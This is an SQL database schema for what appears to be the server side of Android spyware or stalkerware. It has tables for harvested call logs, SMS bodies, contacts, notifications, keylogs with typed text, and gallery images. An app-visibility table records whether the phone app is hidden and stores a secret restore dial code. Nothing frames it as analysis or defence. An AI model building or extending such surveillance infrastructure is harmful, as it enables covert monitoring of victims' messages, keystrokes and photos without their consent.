CREATE TABLE IF NOT EXISTS users (
  id TEXT PRIMARY KEY,
  email TEXT NOT NULL,
  display_name TEXT DEFAULT '',
  created_at INTEGER NOT NULL,
  last_login INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS profiles (
  user_id TEXT PRIMARY KEY,
  email TEXT DEFAULT '',
  display_name TEXT DEFAULT '',
  device_model TEXT DEFAULT '',
  last_seen INTEGER DEFAULT 0,
  FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE IF NOT EXISTS device_info (
  user_id TEXT PRIMARY KEY,
  payload TEXT NOT NULL,
  uploaded_at INTEGER NOT NULL,
  FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE IF NOT EXISTS call_logs (
  id TEXT NOT NULL,
  user_id TEXT NOT NULL,
  number TEXT DEFAULT '',
  type TEXT DEFAULT '',
  date INTEGER DEFAULT 0,
  duration INTEGER DEFAULT 0,
  uploaded_at INTEGER NOT NULL,
  payload TEXT DEFAULT '{}',
  PRIMARY KEY (user_id, id),
  FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE IF NOT EXISTS sms (
  id TEXT NOT NULL,
  user_id TEXT NOT NULL,
  address TEXT DEFAULT '',
  body TEXT DEFAULT '',
  date INTEGER DEFAULT 0,
  type TEXT DEFAULT '',
  uploaded_at INTEGER NOT NULL,
  payload TEXT DEFAULT '{}',
  PRIMARY KEY (user_id, id),
  FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE IF NOT EXISTS contacts (
  id TEXT NOT NULL,
  user_id TEXT NOT NULL,
  name TEXT DEFAULT '',
  number TEXT DEFAULT '',
  type TEXT DEFAULT '',
  uploaded_at INTEGER NOT NULL,
  payload TEXT DEFAULT '{}',
  PRIMARY KEY (user_id, id),
  FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE IF NOT EXISTS notifications (
  id TEXT NOT NULL,
  user_id TEXT NOT NULL,
  title TEXT DEFAULT '',
  text TEXT DEFAULT '',
  package_name TEXT DEFAULT '',
  timestamp INTEGER DEFAULT 0,
  uploaded_at INTEGER NOT NULL,
  payload TEXT DEFAULT '{}',
  PRIMARY KEY (user_id, id),
  FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE IF NOT EXISTS keylogs (
  id TEXT NOT NULL,
  user_id TEXT NOT NULL,
  package_name TEXT DEFAULT '',
  event_type TEXT DEFAULT '',
  text TEXT DEFAULT '',
  before_text TEXT DEFAULT '',
  class_name TEXT DEFAULT '',
  timestamp INTEGER DEFAULT 0,
  uploaded_at INTEGER NOT NULL,
  payload TEXT DEFAULT '{}',
  PRIMARY KEY (user_id, id),
  FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE IF NOT EXISTS gallery (
  id TEXT NOT NULL,
  user_id TEXT NOT NULL,
  file_name TEXT DEFAULT '',
  file_path TEXT DEFAULT '',
  mime_type TEXT DEFAULT 'image/jpeg',
  url TEXT DEFAULT '',
  r2_key TEXT DEFAULT '',
  timestamp INTEGER DEFAULT 0,
  uploaded_at INTEGER NOT NULL,
  payload TEXT DEFAULT '{}',
  PRIMARY KEY (user_id, id),
  FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE IF NOT EXISTS sync_status (
  user_id TEXT NOT NULL,
  data_type TEXT NOT NULL,
  last_sync INTEGER DEFAULT 0,
  count INTEGER DEFAULT 0,
  PRIMARY KEY (user_id, data_type),
  FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE IF NOT EXISTS app_visibility (
  user_id TEXT PRIMARY KEY,
  is_hidden INTEGER NOT NULL DEFAULT 0,
  secret_code TEXT DEFAULT '',
  restore_dial_code TEXT DEFAULT '*#*#737826#*#*',
  hidden_at INTEGER,
  shown_at INTEGER,
  FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE INDEX IF NOT EXISTS idx_call_logs_user ON call_logs(user_id);
CREATE INDEX IF NOT EXISTS idx_sms_user ON sms(user_id);
CREATE INDEX IF NOT EXISTS idx_contacts_user ON contacts(user_id);
CREATE INDEX IF NOT EXISTS idx_notifications_user ON notifications(user_id);
CREATE INDEX IF NOT EXISTS idx_keylogs_user ON keylogs(user_id);
CREATE INDEX IF NOT EXISTS idx_gallery_user ON gallery(user_id);
